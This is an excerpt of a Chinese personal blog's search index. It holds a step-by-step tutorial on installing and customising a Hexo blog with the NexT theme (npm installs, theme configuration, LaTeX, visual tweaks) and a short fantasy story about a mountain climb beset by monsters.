    <url>/2023/01/10/Hexo%20&amp;%20Next%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
鉴于我自己的创作欲，准备正式地经营我的博客XD
</blockquote>

<span id="more"></span>
<h1 id="0x0-说在前面"><a href="#0x0-说在前面" class="headerlink" title="0x0 说在前面:"></a>0x0 说在前面:</h1><blockquote>
<p>环境：Win11<br>参考资料：CodeSheep师傅在b站上的视频 &amp; Next官方文档</p>
<p>在配置的过程中经常忘记自己配了什么，导致这篇博客可能不是很全，后续换电脑重配环境时再补充XD</p>
</blockquote>
<h1 id="0x1-Hexo初始化一个博客"><a href="#0x1-Hexo初始化一个博客" class="headerlink" title="0x1 Hexo初始化一个博客"></a>0x1 Hexo初始化一个博客</h1><p>首先，我们需要在<a href="https://nodejs.org/en/">Node.js官网</a>中下载nodejs</p>
<p>其次，在终端输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
<blockquote>
<p>👆这一步其实可有可无，只不过换到淘宝镜像源以后cnpm的安装速度更快一些</p>
</blockquote>
<p>输入<code>cnpm -install -g hexo-cli</code>安装hexo框架，这样hexo就安装好啦XD</p>
<hr>
<p>建立一个空文件夹，并在命令行按序输入<code>hexo init</code>,这样本地的博客就搭建好啦XD</p>
<p>打开自己的Github，创建一个新仓库，名字为<code>个人名称.github.io</code></p>
<p>在终端输入<code>cnpm install --save hexo-deployer-git</code>安装部署器</p>
<p>打开<strong><em>站点配置文件</em></strong>，修改Deployment下的配置<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></p>
<p>继续在空文件夹打开终端，输入<code>hexo g</code>和<code>hexo d</code>博客就能部署到远端啦XD</p>
<blockquote>
<p>这里我之前是配置过账户和密码的，所以没有弹出配置的问题，当时也是稀里糊涂就弄好了，导致现在不太清楚到底发生了什么，就没办法复盘，等后面换新电脑再说吧XD</p>
</blockquote>
<h1 id="0x2-Hexo-config-amp-Theme-config"><a href="#0x2-Hexo-config-amp-Theme-config" class="headerlink" title="0x2 Hexo config &amp; Theme config"></a>0x2 Hexo config &amp; Theme config</h1><p>我使用的这一个主题👇，这里具体讲讲博客的配置<br><a href="http://theme-next.iissnan.com/">NexT 使用文档 (iissnan.com)</a><br>为了描述方便，在以下说明中：<br>将<strong><em>hexo init生成的config文件</em></strong>称为<code>站点配置文件</code><br>将<strong><em>theme的config文件</em></strong>称为<code>主题配置文件</code></p>
<hr>
<ul>
<li>配置主题<br>在hexo站点目录中用终端输入👇<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
打开<strong><em>站点配置文件</em></strong>，修改:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
<li>个人偏好-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
<li>站点图像-<strong><em>主题配置文件</em></strong><br>修改之前记得在themes\\next\source\images文件夹中保存好你要上传的图像，图像尺寸要符合16x16和32x32<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16.png</span><br><span class="line">  medium: /images/favicon-32x32.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br><span class="line">  #android_manifest: /images/manifest.json</span><br><span class="line">  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>社交链接-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>搜索:先在站点目录下安装<code>npm install hexo-generator-searchdb --save</code></li>
</ul>
<p><strong><em>站点配置文件</em></strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><br><strong><em>主题配置文件</em></strong>：添加<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
<hr>
<ul>
<li>引用示例<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">靡不有初 鲜克有终</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;《诗经》</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
靡不有初 鲜克有终
<p><p>
<br>《诗经》
</blockquote>

</li>
</ul>
<hr>
<ul>
<li>更大更有吸引力的图片来源于<code>&lt;img src=&quot;/image-url&quot; class=&quot;full-image&quot; /&gt;</code></li>
</ul>
<hr>
<ul>
<li>Bootstrap Callout使用方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>class_name</code> 可以是以下列表中的一个值：</p>
<div class="note default">
            <p>default </p>
          </div>
<div class="note primary">
            <p>primary </p>
          </div>
<div class="note success">
            <p>success </p>
          </div>
<div class="note info">
            <p>info </p>
          </div>
<div class="note warning">
            <p>warning </p>
          </div>
<div class="note danger">
            <p>danger </p>
          </div>
<hr>
<h1 id="0x3-LaTex配置"><a href="#0x3-LaTex配置" class="headerlink" title="0x3 LaTex配置"></a>0x3 LaTex配置</h1><blockquote>
<p>我这边pandoc总是出错，于是转用了kramed</p>
</blockquote>
<p>终端输入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p><strong><em>主题配置文件</em></strong></p>
<blockquote>
<p>为了加快渲染速度，per_page我选的true，如果嫌麻烦可以直接false</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">  per_page: true</span><br><span class="line">  </span><br><span class="line">  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">    mhchem: false</span><br></pre></td></tr></table></figure>
<p>记得在需要渲染的md加入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
<p>Test the $X_{n-1}$</p>
<blockquote>
<p>不过渲染后就导致写md时多了几个规矩</p>
<ol>
<li>—-的上下必须各空一格</li>
</ol>
</blockquote>
<h1 id="0x4-Hexo-x-Next-美化"><a href="#0x4-Hexo-x-Next-美化" class="headerlink" title="0x4 Hexo x Next 美化"></a>0x4 Hexo x Next 美化</h1><ul>
<li>动态背景<br>在<strong><em>站点目录</em></strong>打开git，输入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure>
在<strong><em>主题配置文件</em></strong>中加入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # 网络背景</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>记得把其他的动态背景关闭呀，比如</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">  canvas_lines: true</span><br><span class="line">  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>文章结尾<br>在路径 <code>\themes\next\layout\_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件,并添加以下内容：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------文章就到这里啦！&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
接着打开<code>\themes\next\layout\_macro\post.swig</code>文件，在<code>post-body</code> 之后(<code>END POST BODY</code>)， <code>post-footer</code> 之前添加以下代码:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
然后打开<strong><em>主题配置文件</em></strong>，在末尾添加：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>贴一个<a href="https://fontawesome.dashgame.com/">图标库Font Awesome)</a>，<strong><em>主题配置文件</em></strong>里的在线图标基本都要用到它</li>
</ul>
<hr>
<ul>
<li>代码块复制<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>回到顶部与阅读进度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: false</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  # Available values: top | bottom</span><br><span class="line">  position: top</span><br><span class="line">  color: &quot;#7B68EE&quot;</span><br><span class="line">  height: 3px</span><br></pre></td></tr></table></figure>
附一些参考资料XD~</li>
</ul>
<p><a href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">十六进制颜色码_百度百科 (baidu.com)</a></p>
<hr>
<ul>
<li>增加阅读次数/时长和访客数-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #是否开启不蒜子统计功能</span><br><span class="line">  total_visitors: true #是否统计总访客数</span><br><span class="line">  total_visitors_icon: user #访客数图标为人像</span><br><span class="line">  total_views: true #是否同级总访问数</span><br><span class="line">  total_views_icon: eye #访问数图标为眼睛</span><br><span class="line">  post_views: true #是否统计文章访问数</span><br><span class="line">  post_views_icon: eye #访问数图标为眼睛</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>链接样式<br>修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<p>参考文章👇</p>
<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo NexT主题美化总结 | MickeyMiao</a></p>
<p>深度美化-放着吃灰</p>
<p><a href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hexo中对文章md文件分类_貌似掉线的博客-CSDN博客</a><br><a href="https://zhuanlan.zhihu.com/p/64965187">使用 Hexo Hey 管理你的博客 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>Environment</category>
      </categories>
      <tags>
        <tag>tech, Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>异世界见闻录(1)</title>
    <url>/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
我不想沉在无人问津的海底，只好把登顶作为我的理想
</blockquote>

<span id="more"></span>
<p>&emsp;&emsp;雨尚未停歇。<br>&emsp;&emsp;派斯坦擦拭着手里白色的长刀，篝火噼啪的声音回响在山洞的深处。这里是海特山峰的林线，连绵不断的小雨让森林蔓延到极高的海拔，也让覆盖着土壤的地面化为泥沼。<br>&emsp;&emsp;远处的乌云褪去了夜色，昭示着黎明的到来。<br>&emsp;&emsp;“今天还要向上走吗？”我问道。<br>&emsp;&emsp;派斯坦收起手中擦拭刀具的布，拿起一根架在篝火旁的粗树枝，上面还串着不明生物的肉，经过火焰的炙烤，让人分不出那黑色究竟是炭还是肉本来的颜色。<br>&emsp;&emsp;他自顾自地吃了起来，并没有回答我的问题。看着派斯坦吃得津津有味，我也拿起一串，轻轻撕下一块放在嘴里。<br>&emsp;&emsp;苦涩瞬间在嘴里爆开。炙烤后的肉几乎没有水分，让咀嚼变得十分困难，而且还散发着令人抗拒的味道，我实在难以吃下第二口，便把肉放回了篝火旁。<br>&emsp;&emsp;派斯坦也不在乎，他只是向外走，将覆盖在洞口的枝条掀开一个小角，侧身站在洞穴边缘，小心翼翼地用眼睛观察外面的情况。稍许，他走了回来，开始收拾自己的包裹。<br>&emsp;&emsp;天还只是蒙蒙亮，厚厚的黑云让光线变得更加黯淡。看到派斯坦要离开，我也开始收拾行囊。<br>&emsp;&emsp;“山顶上究竟有什么东西，这么值得你探寻？”我看着派斯坦将煮开的热水倒进杯中，忍不住开口问道。<br>&emsp;&emsp;“不知道。”派斯坦的回答十分简短。<br>&emsp;&emsp;话音刚落，他带上避水斗笠，用长刀挑开枝条向外走去，我没来得及追问，只能快步跟着他走出洞穴。可刚走到泥土上我就迅速陷了下去，就好像这被雨水浸透的泥土要囫囵将我吞噬。我吃力地将脚拔出，却看到派斯坦也正十分困难地前进，我不禁感到担忧，何时才能到达这直耸入云的山巅？<br>&emsp;&emsp;“轰——”一只紫黑色的手臂扬起一大片泥土，从离我们不远的地底伸了出来。这手臂近一人高，手掌能将我的头颅轻易抓起。恐惧填满了我的大脑，让我迅速向洞口跑去，可粘性极强的土壤死死的吸附住我的双腿，让我难以动弹。<br>&emsp;&emsp;突然，那怪物手掌向派斯坦拍去，巨大的响声在我耳旁炸起，随后是溅起的泥水。一击不成，这手臂又开始蠕动，想要脱离泥沼的吸附，向派斯坦横扫过去。<br>&emsp;&emsp;“铮——”长刀出鞘，白色的刀光迅速劈在紫黑色的手掌上，使得黑色的血管瞬间张开一个狰狞的裂缝，血液与碎肉迸溅在派斯坦的斗笠与披风上，而后被渐大的雨势冲洗干净。<br>&emsp;&emsp;那手臂没了动静。<br>&emsp;&emsp;我长舒一口气，却看到派斯坦切下怪物手臂的一块肌肉，在雨水中洗涤干净后装进包里。不愉快的早餐经历迅速涌上脑海，我感到胃中一阵翻涌。<br>&emsp;&emsp;“这山这么危险，为什么还要坚持爬到山顶啊？”为了转移注意力，我又搬出今早的问题。<br>&emsp;&emsp;”不知道，“派斯坦将目光移向我，”可是山脚已经被不断上涨的岁月之海淹没，我到了半山腰，已经没有下山的余地了。我不想沉在无人问津的海底，只好把登顶作为我的理想。“<br>&emsp;&emsp;我并不清楚山脚的情况，只能糊里糊涂地跟着派斯坦继续前行。这几小时的旅途并无危机，山脉也不陡峭，跟着上升的海拔，我们走到了一片旷野。<br>&emsp;&emsp;雨水让能见度变得非常低，可前方似乎浮现出了白色的雪线，这意味着登顶之旅即将迈入新的阶段，而雪地也会比泥沼要好走一些。<br>&emsp;&emsp;”轰——“紫黑色的手臂擦着我的脸颊从地底冒出，巨大的冲击力把我掀翻在地。我惊慌地看向派斯坦，却发现他的身边也冒出了一只怪物手臂。<br>&emsp;&emsp;我想从地上爬起，可是这次泥沼彻底将我粘在地面，倏地，我身边的那只怪物手臂在我眼前迅速放大，我用尽全身力气将自己的手臂抬起，想要抵挡这比我上半身还宽的手掌，却被深深地拍进泥沼当中。<br>&emsp;&emsp;我听见了骨骼碎裂的声音，随后泥水灌进了我的耳朵。我感受到那怪物手掌正迅速握紧，因为周围的泥土正在不断地挤压我的身体。<br>&emsp;&emsp;在意识消散之前，极力向外一瞥——<br>&emsp;&emsp;我看见飘摇的风雪，看见垂暮的旷野，看见挥舞着长刀的派斯坦，用坚定驱散着孤单。  </p>
]]></content>
      <categories>
        <category>sketch</category>
      </categories>
  </entry>
</search>
